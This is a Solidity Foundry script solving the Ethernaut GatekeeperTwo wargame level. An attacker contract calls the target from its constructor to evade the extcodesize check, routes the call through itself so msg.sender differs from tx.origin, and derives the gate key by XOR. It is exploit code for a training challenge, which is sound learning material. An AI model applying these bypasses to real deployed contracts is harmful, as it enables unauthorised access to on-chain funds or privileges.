// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/GatekeeperTwo.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract Attacker {
    GatekeeperTwo gatekeeperTwo;

    constructor(GatekeeperTwo _gatekeeperTwo) {
        gatekeeperTwo = _gatekeeperTwo;
        // !! constructor => Attacker extcodesize === 0 at this time
        // !! ===> pass gateTwo

        attack();
    }

    function attack() public {
        // !! Attacker external call to gatekeeperTwo
        // from gatekeeperTwo.enter pov : msg.sender (=== address(Attacker)) != tx.origin (=== Attacker deployer)
        // !! ===> pass gateOne

        // modifier gateThree(bytes8 _gateKey)
        // uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(gateKey) == type(uint64).max;

        // - XOR Commutativity
        // A XOR B = B XOR A
        // uint64(gateKey) ^ uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) == type(uint64).max;

        // - XOR Involution
        // (A XOR B) XOR B = A
        // (uint64(gateKey) ^ uint64(bytes8(keccak256(abi.encodePacked(msg.sender))))) ^ uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) == type(uint64).max ^ uint64(bytes8(keccak256(abi.encodePacked(msg.sender))));

        // !! use Attacker address
        uint64 gateKey = type(uint64).max ^ uint64(bytes8(keccak256(abi.encodePacked(address(this)))));

        // !! ===> pass gateThree
        gatekeeperTwo.enter(bytes8(gateKey));
    }
}

contract GatekeeperTwoScript is Script {
    address constant ETHERNAUT_CONTRACT_ADDRESS = 0x1a40B0f95858fef69aD849aF243be364b8B5e4fE;
    GatekeeperTwo public gatekeeperTwo = GatekeeperTwo(ETHERNAUT_CONTRACT_ADDRESS);

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        // deploy attacker from PLAYER (= owner of PRIVATE_KEY)
        new Attacker(gatekeeperTwo);
        vm.stopBroadcast();
    }
}
